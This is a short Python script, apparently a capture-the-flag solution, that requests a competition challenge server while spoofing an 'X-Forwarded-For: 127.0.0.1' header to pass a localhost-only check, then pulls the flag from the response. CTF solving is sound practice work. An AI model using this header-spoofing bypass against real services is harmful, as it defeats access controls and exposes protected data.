import requests
headers = {'X-Forwarded-For':'127.0.0.1'}
target_url = 'http://chal.competitivecyber.club:8081'

if __name__ == '__main__':
	r = requests.get(target_url, headers = headers)
	print(list(filter(lambda tok: b'CACI' in tok, r.content.split()))[0].decode())
